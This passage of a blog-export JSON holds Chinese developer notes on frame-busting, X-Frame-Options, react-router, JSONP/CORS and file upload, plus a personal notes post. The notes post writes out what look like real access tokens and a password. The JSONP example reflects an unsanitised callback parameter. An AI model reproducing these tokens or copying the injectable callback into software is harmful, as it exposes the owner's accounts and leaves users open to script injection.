加载的页面地址\\n\\nIE8+都支持。一般设置成`SAMEORIGIN`就OK\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>HTML5 <code>&lt;iframe&gt; sandbox</code></p>\n</blockquote>\n<pre><code>值\t描述\n&quot;&quot;(为空)\t应用以下所有的限制。\nallow-same-origin\t允许 iframe 内容被视为与包含文档有相同的来源。\nallow-top-navigation\t允许 iframe 内容从包含文档导航（加载）内容。\nallow-forms\t允许表单提交。\nallow-scripts\t允许脚本执行。\n</code></pre>\n<p><code>&lt;iframe src=&quot;xxxx&quot; sandbox=&quot;value&quot;&gt;</code></p>\n<p>当别人要frame你的网页时候，只要用sandbox不写&quot;allow-script&quot;时，即使页面写了下面代码，也不能防止别人frame。因为js根本不会执行。但是，css，html，form行为还是可以用的。</p>\n<pre><code>if(top.location!=self.location){\n   top.location=self.location;\n}\n</code></pre>\n<blockquote>\n<p>解决办法<code>X-Frame-Options</code></p>\n</blockquote>\n<p>好在可以采用 HTTP头<code>X-Frame-Options</code>解决问题。可以设置以下3个值。</p>\n<ul>\n<li>DENY:---------------浏览器会拒绝当前页面加载任何 frame 页面</li>\n<li>SAMEORIGIN:---------frame页面的地址只能为同源域名下的页面</li>\n<li>ALLOW-FROM origin:--则可以定义允许 frame 加载的页面地址</li>\n</ul>\n<p>IE8+都支持。一般设置成<code>SAMEORIGIN</code>就OK</p>\n<!--kg-card-end: markdown-->","comment_id":"42","plaintext":"> HTML5 <iframe> sandbox\n\n\n值\t描述\n\"\"(为空)\t应用以下所有的限制。\nallow-same-origin\t允许 iframe 内容被视为与包含文档有相同的来源。\nallow-top-navigation\t允许 iframe 内容从包含文档导航（加载）内容。\nallow-forms\t允许表单提交。\nallow-scripts\t允许脚本执行。\n\n\n<iframe src=\"xxxx\" sandbox=\"value\">\n\n当别人要frame你的网页时候，只要用sandbox不写\"allow-script\"时，即使页面写了下面代码，也不能防止别人frame。因为js根本不会执行。但是，css，html，form行为还是可以用的。\n\nif(top.location!=self.location){\n   top.location=self.location;\n}\n\n\n> 解决办法X-Frame-Options\n\n\n好在可以采用 HTTP头X-Frame-Options解决问题。可以设置以下3个值。\n\n * DENY:---------------浏览器会拒绝当前页面加载任何 frame 页面\n * SAMEORIGIN:---------frame页面的地址只能为同源域名下的页面\n * ALLOW-FROM origin:--则可以定义允许 frame 加载的页面地址\n\nIE8+都支持。一般设置成SAMEORIGIN就OK","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-05-21T08:36:29.000Z","created_by":"1","updated_at":"2017-01-17T06:19:26.000Z","updated_by":"1","published_at":"2016-05-21T08:59:42.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e8","uuid":"ec388e5c-d75f-49c6-8b5f-54a7d37b9314","title":"React-Router使用","slug":"react-router","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"百度搜出来的都是过时api。现在\\\"react-router\\\": \\\"^2.4.0\\\"了。\\n\\n> 1.activeClassName\\n\\n以前的active是默认添加是active。 现在要手动开启了。\\n\\n```\\n<Link activeClassName=\\\"link_active\\\" to=\\\"/home\\\" >首页</Link>  \\n<Link activeClassName=\\\"link_active\\\" to=\\\"/addcase\\\" >添加案例</Link>  \\n<Link activeClassName=\\\"link_active\\\" to=\\\"/casequery\\\" >ZZZZ</Link>  \\n```\\n\\n> 2.默认路由\\n```\\nIndexRoute component={Home} /> 这个不能用了\\n\\n<IndexRedirect to=\\\"home\\\" /> 最新。\\n\\n<Redirect from=\\\"/\\\" to=\\\"home\\\" />可以跳转，但是，不会为Link增加activeClassName。  \\n\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>百度搜出来的都是过时api。现在&quot;react-router&quot;: &quot;^2.4.0&quot;了。</p>\n<blockquote>\n<p>1.activeClassName</p>\n</blockquote>\n<p>以前的active是默认添加是active。 现在要手动开启了。</p>\n<pre><code>&lt;Link activeClassName=&quot;link_active&quot; to=&quot;/home&quot; &gt;首页&lt;/Link&gt;  \n&lt;Link activeClassName=&quot;link_active&quot; to=&quot;/addcase&quot; &gt;添加案例&lt;/Link&gt;  \n&lt;Link activeClassName=&quot;link_active&quot; to=&quot;/casequery&quot; &gt;ZZZZ&lt;/Link&gt;  \n</code></pre>\n<blockquote>\n<p>2.默认路由</p>\n</blockquote>\n<pre><code>IndexRoute component={Home} /&gt; 这个不能用了\n\n&lt;IndexRedirect to=&quot;home&quot; /&gt; 最新。\n\n&lt;Redirect from=&quot;/&quot; to=&quot;home&quot; /&gt;可以跳转，但是，不会为Link增加activeClassName。  \n\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"43","plaintext":"百度搜出来的都是过时api。现在\"react-router\": \"^2.4.0\"了。\n\n> 1.activeClassName\n\n\n以前的active是默认添加是active。 现在要手动开启了。\n\n<Link activeClassName=\"link_active\" to=\"/home\" >首页</Link>  \n<Link activeClassName=\"link_active\" to=\"/addcase\" >添加案例</Link>  \n<Link activeClassName=\"link_active\" to=\"/casequery\" >ZZZZ</Link>  \n\n\n> 2.默认路由\n\n\nIndexRoute component={Home} /> 这个不能用了\n\n<IndexRedirect to=\"home\" /> 最新。\n\n<Redirect from=\"/\" to=\"home\" />可以跳转，但是，不会为Link增加activeClassName。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-06-01T10:46:51.000Z","created_by":"1","updated_at":"2017-01-17T06:20:39.000Z","updated_by":"1","published_at":"2016-06-01T10:54:22.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e9","uuid":"f5ed7d54-83f8-40a9-b623-9eee16ac9bea","title":"JavaScript与有限状态机","slug":"javascriptyu-you-xian-zhuang-tai-ji","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"简单介绍一个有限状态机的函数库[Javascript Finite State Machine](https://github.com/jakesgordon/javascript-state-machine)。\\n > 生成实例\\n\\n`var fsm = StateMachine.create();`\\n\\n> 创建\\n\\n```\\nvar state = StateMachine.create({  \\n    initial: 'null', //初始状态\\n    events: [\\n        { name: 'to_scene',  from: 'null',  to: 'scene' },\\n        { name: 'to_scene2', from: 'scene', to: 'scene2'},\\n\\n    ],\\n    callbacks: {\\n        onto_scene:  function(event, from, to, msg) { console.log('to_scene ' + msg);               },\\n        onto_scene2:  function(event, from, to, msg) { console.log('to_scene2 ' + msg);            },\\n        onnull:  function(event, from, to, msg)      { console.log(to)    },\\n        onscene:    function(event, from, to)      { console.log(to)     },\\n        onscene2:    function(event, from, to)      { console.log(to)     },\\n    }\\n});\\n\\nexport default state  \\n```\\n> 触发\\n```\\nstate.to_scene(1)  \\nstate.to_scene2(2)  \\n```\\n> 触发\\n\\n![](/content/images/2016/06/038EBQON--2FIS2M2-J---H.png)\\n注意，onscene在onto_scene前面执行的。\\n\\n> 其他API\\n\\n* fsm.current ：返回当前状态。\\n* fsm.is(s) ：返回一个布尔值，表示状态s是否为当前状态。\\n* fsm.can(e) ：返回一个布尔值，表示事件e是否能在当前状态触发。\\n* fsm.cannot(e) ：返回一个布尔值，表示事件e是否不能在当前状态触发。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>简单介绍一个有限状态机的函数库<a href=\"https://github.com/jakesgordon/javascript-state-machine\">Javascript Finite State Machine</a>。</p>\n<blockquote>\n<p>生成实例</p>\n</blockquote>\n<p><code>var fsm = StateMachine.create();</code></p>\n<blockquote>\n<p>创建</p>\n</blockquote>\n<pre><code>var state = StateMachine.create({  \n    initial: 'null', //初始状态\n    events: [\n        { name: 'to_scene',  from: 'null',  to: 'scene' },\n        { name: 'to_scene2', from: 'scene', to: 'scene2'},\n\n    ],\n    callbacks: {\n        onto_scene:  function(event, from, to, msg) { console.log('to_scene ' + msg);               },\n        onto_scene2:  function(event, from, to, msg) { console.log('to_scene2 ' + msg);            },\n        onnull:  function(event, from, to, msg)      { console.log(to)    },\n        onscene:    function(event, from, to)      { console.log(to)     },\n        onscene2:    function(event, from, to)      { console.log(to)     },\n    }\n});\n\nexport default state  \n</code></pre>\n<blockquote>\n<p>触发</p>\n</blockquote>\n<pre><code>state.to_scene(1)  \nstate.to_scene2(2)  \n</code></pre>\n<blockquote>\n<p>触发</p>\n</blockquote>\n<p><img src=\"/content/images/2016/06/038EBQON--2FIS2M2-J---H.png\" alt=\"\"><br>\n注意，onscene在onto_scene前面执行的。</p>\n<blockquote>\n<p>其他API</p>\n</blockquote>\n<ul>\n<li>fsm.current ：返回当前状态。</li>\n<li>fsm.is(s) ：返回一个布尔值，表示状态s是否为当前状态。</li>\n<li>fsm.can(e) ：返回一个布尔值，表示事件e是否能在当前状态触发。</li>\n<li>fsm.cannot(e) ：返回一个布尔值，表示事件e是否不能在当前状态触发。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"44","plaintext":"简单介绍一个有限状态机的函数库Javascript Finite State Machine\n[https://github.com/jakesgordon/javascript-state-machine]。\n\n> 生成实例\n\n\nvar fsm = StateMachine.create();\n\n> 创建\n\n\nvar state = StateMachine.create({  \n    initial: 'null', //初始状态\n    events: [\n        { name: 'to_scene',  from: 'null',  to: 'scene' },\n        { name: 'to_scene2', from: 'scene', to: 'scene2'},\n\n    ],\n    callbacks: {\n        onto_scene:  function(event, from, to, msg) { console.log('to_scene ' + msg);               },\n        onto_scene2:  function(event, from, to, msg) { console.log('to_scene2 ' + msg);            },\n        onnull:  function(event, from, to, msg)      { console.log(to)    },\n        onscene:    function(event, from, to)      { console.log(to)     },\n        onscene2:    function(event, from, to)      { console.log(to)     },\n    }\n});\n\nexport default state  \n\n\n> 触发\n\n\nstate.to_scene(1)  \nstate.to_scene2(2)  \n\n\n> 触发\n\n\n\n注意，onscene在onto_scene前面执行的。\n\n> 其他API\n\n\n * fsm.current ：返回当前状态。\n * fsm.is(s) ：返回一个布尔值，表示状态s是否为当前状态。\n * fsm.can(e) ：返回一个布尔值，表示事件e是否能在当前状态触发。\n * fsm.cannot(e) ：返回一个布尔值，表示事件e是否不能在当前状态触发。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-06-24T09:27:11.000Z","created_by":"1","updated_at":"2017-01-17T06:23:22.000Z","updated_by":"1","published_at":"2016-06-28T09:24:03.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ea","uuid":"b36f2ec8-c9bd-45a2-b326-986c3ae01c66","title":"UNITY3D疑问","slug":"echarts","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nApply Root Motion:\\n如果我们勾选了Animator组件中的Apply Root Motion选项\\n角色的Transform将不能通过脚本来直接赋值，而是通过动画的运动的来改变的\\n如果我们不勾选\\n我们就可以用脚本改变角色的Tranform\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>Apply Root Motion:\n如果我们勾选了Animator组件中的Apply Root Motion选项\n角色的Transform将不能通过脚本来直接赋值，而是通过动画的运动的来改变的\n如果我们不勾选\n我们就可以用脚本改变角色的Tranform\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"45","plaintext":"Apply Root Motion:\n如果我们勾选了Animator组件中的Apply Root Motion选项\n角色的Transform将不能通过脚本来直接赋值，而是通过动画的运动的来改变的\n如果我们不勾选\n我们就可以用脚本改变角色的Tranform","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-05-20T10:18:36.000Z","created_by":"1","updated_at":"2016-08-25T17:10:58.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2eb","uuid":"0da7d96c-5e12-4a26-8ac6-3e3236331b95","title":"跨域（JSONP，CORS）","slug":"kua-yu-jsonp-cors","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> JSONP\\n\\n服务器端：\\n```\\nrouter.get('/GET_XSS_project', function(req, res, next) {  \\n    db(function(err, connection) {\\n        connection.query( \\\"select * from xssProject where id = ?\\\",[req.query.xssProjectID], function(err, rows) {\\n            if(err){console.log(err)}\\n            connection.release();\\n            res.type('text/javascript');\\n            res.send(`${req.query.callback}(${JSON.stringify(rows)})`);\\n        });\\n    });\\n});\\n```\\n前端：\\n```\\n        $.ajax({\\n           url:config.JSONP.GET_XSS_project.url,\\n            type:'get',\\n            dataType: \\\"jsonp\\\",\\n            jsonpCallback: \\\"xssJsonpCallback\\\",\\n        }).done((data)=>{\\n            this.setState({xssProjectList:data})\\n        })\\n```\\n> CORS\\n\\n只需在服务器端设置HTTP头，postAccess-Control-Allow-Origin:即可。生成环境，把换成你需要跨域的网站。\\n```\\nrouter.post('/CORS', function(req, res, next) {\\n     res.setHeader('Access-Control-Allow-Origin','*');\\n    res.send(`(${JSON.stringify({name:'CORS'})})`);\\n});\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>JSONP</p>\n</blockquote>\n<p>服务器端：</p>\n<pre><code>router.get('/GET_XSS_project', function(req, res, next) {  \n    db(function(err, connection) {\n        connection.query( &quot;select * from xssProject where id = ?&quot;,[req.query.xssProjectID], function(err, rows) {\n            if(err){console.log(err)}\n            connection.release();\n            res.type('text/javascript');\n            res.send(`${req.query.callback}(${JSON.stringify(rows)})`);\n        });\n    });\n});\n</code></pre>\n<p>前端：</p>\n<pre><code>        $.ajax({\n           url:config.JSONP.GET_XSS_project.url,\n            type:'get',\n            dataType: &quot;jsonp&quot;,\n            jsonpCallback: &quot;xssJsonpCallback&quot;,\n        }).done((data)=&gt;{\n            this.setState({xssProjectList:data})\n        })\n</code></pre>\n<blockquote>\n<p>CORS</p>\n</blockquote>\n<p>只需在服务器端设置HTTP头，postAccess-Control-Allow-Origin:即可。生成环境，把换成你需要跨域的网站。</p>\n<pre><code>router.post('/CORS', function(req, res, next) {\n     res.setHeader('Access-Control-Allow-Origin','*');\n    res.send(`(${JSON.stringify({name:'CORS'})})`);\n});\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"46","plaintext":"> JSONP\n\n\n服务器端：\n\nrouter.get('/GET_XSS_project', function(req, res, next) {  \n    db(function(err, connection) {\n        connection.query( \"select * from xssProject where id = ?\",[req.query.xssProjectID], function(err, rows) {\n            if(err){console.log(err)}\n            connection.release();\n            res.type('text/javascript');\n            res.send(`${req.query.callback}(${JSON.stringify(rows)})`);\n        });\n    });\n});\n\n\n前端：\n\n        $.ajax({\n           url:config.JSONP.GET_XSS_project.url,\n            type:'get',\n            dataType: \"jsonp\",\n            jsonpCallback: \"xssJsonpCallback\",\n        }).done((data)=>{\n            this.setState({xssProjectList:data})\n        })\n\n\n> CORS\n\n\n只需在服务器端设置HTTP头，postAccess-Control-Allow-Origin:即可。生成环境，把换成你需要跨域的网站。\n\nrouter.post('/CORS', function(req, res, next) {\n     res.setHeader('Access-Control-Allow-Origin','*');\n    res.send(`(${JSON.stringify({name:'CORS'})})`);\n});","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-07-01T01:37:57.000Z","created_by":"1","updated_at":"2017-01-17T06:31:43.000Z","updated_by":"1","published_at":"2016-07-01T05:35:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ec","uuid":"46e4bbdc-1602-43ff-8bbb-c36f7037fb9d","title":"html5拖动文件上传","slug":"fromde-wen-jian-shang-chuan","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"        $(document).on({  //阻止默认行为\\n            dragleave:function(e){    //拖离\\n                e.preventDefault();\\n            },\\n            drop:function(e){  //拖后放\\n                e.preventDefault();\\n            },\\n            dragenter:function(e){    //拖进\\n                e.preventDefault();\\n            },\\n            dragover:function(e){    //拖来拖去\\n                e.preventDefault();\\n            }\\n        });\\n        var box = document.getElementById('drop_area'); //拖拽区域\\n        box.addEventListener(\\\"drop\\\",function(e){\\n            e.preventDefault(); //取消默认浏览器拖拽效果\\n            var fileList = e.dataTransfer.files; //获取文件对象\\n            console.log(fileList)\\n            //检测是否是拖拽文件到页面的操作\\n            if(fileList.length == 0){\\n                return false;\\n            }\\n            //检测文件是不是APK\\n           if(fileList[0].name.substring(fileList[0].name.lastIndexOf('.')+1).toLowerCase()!=='apk'){\\n                alert(\\\"您拖的不是APK！\\\");\\n                return false;\\n            }\\n            var Form=new FormData();\\n            Form.append('file',fileList[0]);\\n            $.ajax({\\n                url: config.api.UPLOAD_APK.url,\\n                type: \\\"POST\\\",\\n                data: Form,\\n                processData: false,  // 告诉jQuery不要去处理发送的数据\\n                contentType: false   // 告诉jQuery不要去设置Content-Type请求头\\n            }).done(function (data) {\\n                if(data.status===0){\\n                    Message.show(<span><i className=\\\"glyphicon glyphicon-ok\\\"></i>文件上传成功</span>, \\\"success\\\")\\n                    setTimeout(function () {\\n                        $(\\\".rct-message.rct-message-success\\\").children('button').eq(0).click();\\n                    },1000)\\n                }\\n            });\\n        },false);\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>    $(document).on({  //阻止默认行为\n        dragleave:function(e){    //拖离\n            e.preventDefault();\n        },\n        drop:function(e){  //拖后放\n            e.preventDefault();\n        },\n        dragenter:function(e){    //拖进\n            e.preventDefault();\n        },\n        dragover:function(e){    //拖来拖去\n            e.preventDefault();\n        }\n    });\n    var box = document.getElementById('drop_area'); //拖拽区域\n    box.addEventListener(&quot;drop&quot;,function(e){\n        e.preventDefault(); //取消默认浏览器拖拽效果\n        var fileList = e.dataTransfer.files; //获取文件对象\n        console.log(fileList)\n        //检测是否是拖拽文件到页面的操作\n        if(fileList.length == 0){\n            return false;\n        }\n        //检测文件是不是APK\n       if(fileList[0].name.substring(fileList[0].name.lastIndexOf('.')+1).toLowerCase()!=='apk'){\n            alert(&quot;您拖的不是APK！&quot;);\n            return false;\n        }\n        var Form=new FormData();\n        Form.append('file',fileList[0]);\n        $.ajax({\n            url: config.api.UPLOAD_APK.url,\n            type: &quot;POST&quot;,\n            data: Form,\n            processData: false,  // 告诉jQuery不要去处理发送的数据\n            contentType: false   // 告诉jQuery不要去设置Content-Type请求头\n        }).done(function (data) {\n            if(data.status===0){\n                Message.show(&lt;span&gt;&lt;i className=&quot;glyphicon glyphicon-ok&quot;&gt;&lt;/i&gt;文件上传成功&lt;/span&gt;, &quot;success&quot;)\n                setTimeout(function () {\n                    $(&quot;.rct-message.rct-message-success&quot;).children('button').eq(0).click();\n                },1000)\n            }\n        });\n    },false);</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"47","plaintext":"    $(document).on({  //阻止默认行为\n        dragleave:function(e){    //拖离\n            e.preventDefault();\n        },\n        drop:function(e){  //拖后放\n            e.preventDefault();\n        },\n        dragenter:function(e){    //拖进\n            e.preventDefault();\n        },\n        dragover:function(e){    //拖来拖去\n            e.preventDefault();\n        }\n    });\n    var box = document.getElementById('drop_area'); //拖拽区域\n    box.addEventListener(\"drop\",function(e){\n        e.preventDefault(); //取消默认浏览器拖拽效果\n        var fileList = e.dataTransfer.files; //获取文件对象\n        console.log(fileList)\n        //检测是否是拖拽文件到页面的操作\n        if(fileList.length == 0){\n            return false;\n        }\n        //检测文件是不是APK\n       if(fileList[0].name.substring(fileList[0].name.lastIndexOf('.')+1).toLowerCase()!=='apk'){\n            alert(\"您拖的不是APK！\");\n            return false;\n        }\n        var Form=new FormData();\n        Form.append('file',fileList[0]);\n        $.ajax({\n            url: config.api.UPLOAD_APK.url,\n            type: \"POST\",\n            data: Form,\n            processData: false,  // 告诉jQuery不要去处理发送的数据\n            contentType: false   // 告诉jQuery不要去设置Content-Type请求头\n        }).done(function (data) {\n            if(data.status===0){\n                Message.show(<span><i className=\"glyphicon glyphicon-ok\"></i>文件上传成功</span>, \"success\")\n                setTimeout(function () {\n                    $(\".rct-message.rct-message-success\").children('button').eq(0).click();\n                },1000)\n            }\n        });\n    },false);","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-05-26T06:43:39.000Z","created_by":"1","updated_at":"2017-01-17T06:17:18.000Z","updated_by":"1","published_at":"2016-05-26T07:59:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ed","uuid":"a1400753-ca35-4abd-8fd4-43ddbea2ea98","title":"笔记本","slug":"bi-ji-ben","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n\\n```\\nfuser -n tcp 23456   //????????????\\nlsof -i:23456       //????????????\\n```\\n\\n`'export PATH=$PATH:/home/ldh/node-v6.9.1-linux-x64/bin'>> ~/.bashrc`\\n\\n\\n\\n\\nvscode `5812d4380e8636bb9816e30f9ad103adbeaabd2b`\\n\\nMarketplace (publish) 1year  `g2a3fyqmtz3w5hr37jkae2kjobu7axqgdb7nek3jnjoqvkfek4la`\\n\\n\\nvscode\\ngist id `6ad3fe96e97570fba9b23fdd1e27328e`\\ngist token `ad80d9cde11eddec18279b13d56647a273dd6890`\\n\\n```\\nsudo apt-get  install  build-essential  # 安装gcc g++\\n\\nexport http_proxy=socks5://127.0.0.1:1080\\nexport https_proxy=socks5://127.0.0.1:1080\\n\\n# depot_tools\\nexport PATH=$PATH:$HOME/softwares/depot_tools\\n\\nalias hp=\\\"http_proxy=http://127.0.0.1:8124 && https_proxy=http://127.0.0.1:8124\\\"\\nalias ehp=\\\"export http_proxy=http://127.0.0.1:8124 && export https_proxy=http://127.0.0.1:8124\\\"\\n\\n```\\n \\n> 解决apt-get中Unmet dependencies问题\\n```\\nsudo apt --fix-broken install  \\nsudo apt-get update  \\nsudo apt-get upgrade  \\n```\\n\\n```\\nfunction arrangement(n, num) {\\n  let res = [];\\n  select(n, num, [])\\n  function select(n, num, selected) {\\n    if (num === 0) { res.push(selected.slice(0)); return; }\\n    for (let i = 0; i < n; i++) {\\n      if (selected.includes(i)) {\\n        continue;\\n      }\\n      selected.push(i)\\n      select(n, num - 1, selected);\\n      selected.pop(i)\\n    }\\n  }\\n  return res;\\n}\\n\\nfunction combination(n, num) {\\n  let res = [];\\n  select(n, num, [], 0)\\n  function select(n, num, selected, index) {\\n    if (num === 0) { res.push(selected.slice(0)); return; }\\n    for (let i = index; i < n; i++) {\\n      if (selected.includes(i)) {\\n        continue;\\n      }\\n      selected.push(i)\\n      select(n, num - 1, selected, i + 1);\\n      selected.pop(i)\\n    }\\n  }\\n  return res;\\n}\\n```\\n\\n./build/install-build-deps.sh --no-chromeos-fonts\\n```\\nexport const milliFormat = (() => {\\n    const DIGIT_PATTERN = /(^|\\\\s)-?\\\\d+(?=\\\\.?\\\\d*($|\\\\s))/g;\\n    const MILLI_PATTERN = /(?=(?!\\\\b)(\\\\d{3})+$)/g;\\n\\n    return (input) => input && input.toString()\\n        .replace(DIGIT_PATTERN, (m) => m.replace(MILLI_PATTERN, ','));\\n})();\\n```\\n\\n670120plL\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>fuser -n tcp 23456   //????????????\nlsof -i:23456       //????????????\n</code></pre>\n<p><code>'export PATH=$PATH:/home/ldh/node-v6.9.1-linux-x64/bin'&gt;&gt; ~/.bashrc</code></p>\n<p>vscode <code>5812d4380e8636bb9816e30f9ad103adbeaabd2b</code></p>\n<p>Marketplace (publish) 1year  <code>g2a3fyqmtz3w5hr37jkae2kjobu7axqgdb7nek3jnjoqvkfek4la</code></p>\n<p>vscode<br>\ngist id <code>6ad3fe96e97570fba9b23fdd1e27328e</code><br>\ngist token <code>ad80d9cde11eddec18279b13d56647a273dd6890</code></p>\n<pre><code>sudo apt-get  install  build-essential  # 安装gcc g++\n\nexport http_proxy=socks5://127.0.0.1:1080\nexport https_proxy=socks5://127.0.0.1:1080\n\n# depot_tools\nexport PATH=$PATH:$HOME/softwares/depot_tools\n\nalias hp=&quot;http_proxy=http://127.0.0.1:8124 &amp;&amp; https_proxy=http://127.0.0.1:8124&quot;\nalias ehp=&quot;export http_proxy=http://127.0.0.1:8124 &amp;&amp; export https_proxy=http://127.0.0.1:8124&quot;\n\n</code></pre>\n<blockquote>\n<p>解决apt-get中Unmet dependencies问题</p>\n</blockquote>\n<pre><code>sudo apt --fix-broken install  \nsudo apt-get update  \nsudo apt-get upgrade  \n</code></pre>\n<pre><code>function arrangement(n, num) {\n  let res = [];\n  select(n, num, [])\n  function select(n, num, selected) {\n    if (num === 0) { res.push(selected.slice(0)); return; }\n    for (let i = 0; i &lt; n; i++) {\n      if (selected.includes(i)) {\n        continue;\n      }\n      selected.push(i)\n      select(n, num - 1, selected);\n      selected.pop(i)\n    }\n  }\n  return res;\n}\n\nfunction combination(n, num) {\n  let res = [];\n  select(n, num, [], 0)\n  function select(n, num, selected, index) {\n    if (num === 0) { res.push(selected.slice(0)); return; }\n    for (let i = index; i &lt; n; i++) {\n      if (selected.includes(i)) {\n        continue;\n      }\n      selected.push(i)\n      select(n, num - 1, selected, i + 1);\n      selected.pop(i)\n    }\n  }\n  return res;\n}\n</code></pre>\n<p>./build/install-build-deps.sh --no-chromeos-fonts</p>\n<pre><code>export const milliFormat = (() =&gt; {\n    const DIGIT_PATTERN = /(^|\\s)-?\\d+(?=\\.?\\d*($|\\s))/g;\n    const MILLI_PATTERN = /(?=(?!\\b)(\\d{3})+$)/g;\n\n    return (input) =&gt; input &amp;&amp; input.toString()\n        .replace(DIGIT_PATTERN, (m) =&gt; m.replace(MILLI_PATTERN, ','));\n})();\n</code></pre>\n<p>670120plL</p>\n<!--kg-card-end: markdown-->","comment_id":"48","plaintext":"fuser -n tcp 23456   //????????????\nlsof -i:23456       //????????????\n\n\n'export PATH=$PATH:/home/ldh/node-v6.9.1-linux-x64/bin'>> ~/.bashrc\n\nvscode 5812d4380e8636bb9816e30f9ad103adbeaabd2b\n\nMarketplace (publish) 1year g2a3fyqmtz3w5hr37jkae2kjobu7axqgdb7nek3jnjoqvkfek4la\n\nvscode\ngist id 6ad3fe96e97570fba9b23fdd1e27328e\ngist token ad80d9cde11eddec18279b13d56647a273dd6890\n\nsudo apt-get  install  build-essential  # 安装gcc g++\n\nexport http_proxy=socks5://127.0.0.1:1080\nexport https_proxy=socks5://127.0.0.1:1080\n\n# depot_tools\nexport PATH=$PATH:$HOME/softwares/depot_tools\n\nalias hp=\"http_proxy=http://127.0.0.1:8124 && https_proxy=http://127.0.0.1:8124\"\nalias ehp=\"export http_proxy=http://127.0.0.1:8124 && export https_proxy=http://127.0.0.1:8124\"\n\n\n\n> 解决apt-get中Unmet dependencies问题\n\n\nsudo apt --fix-broken install  \nsudo apt-get update  \nsudo apt-get upgrade  \n\n\nfunction arrangement(n, num) {\n  let res = [];\n  select(n, num, [])\n  function select(n, num, selected) {\n    if (num === 0) { res.push(selected.slice(0)); return; }\n    for (let i = 0; i < n; i++) {\n      if (selected.includes(i)) {\n        continue;\n      }\n      selected.push(i)\n      select(n, num - 1, selected);\n      selected.pop(i)\n    }\n  }\n  return res;\n}\n\nfunction combination(n, num) {\n  let res = [];\n  select(n, num, [], 0)\n  function select(n, num, selected, index) {\n    if (num === 0) { res.push(selected.slice(0)); return; }\n    for (let i = index; i < n; i++) {\n      if (selected.includes(i)) {\n        continue;\n      }\n      selected.push(i)\n      select(n, num - 1, selected, i + 1);\n      selected.pop(i)\n    }\n  }\n  return res;\n}\n\n\n./build/install-build-deps.sh --no-chromeos-fonts\n\nexport const milliFormat = (() => {\n    const DIGIT_PATTERN = /(^|\\s)-?\\d+(?=\\.?\\d*($|\\s))/g;\n    const MILLI_PATTERN = /(?=(?!\\b)(\\d{3})+$)/g;\n\n    return (input) => input && input.toString()\n        .replace(DIGIT_PATTERN, (m) => m.replace(MILLI_PATTERN, 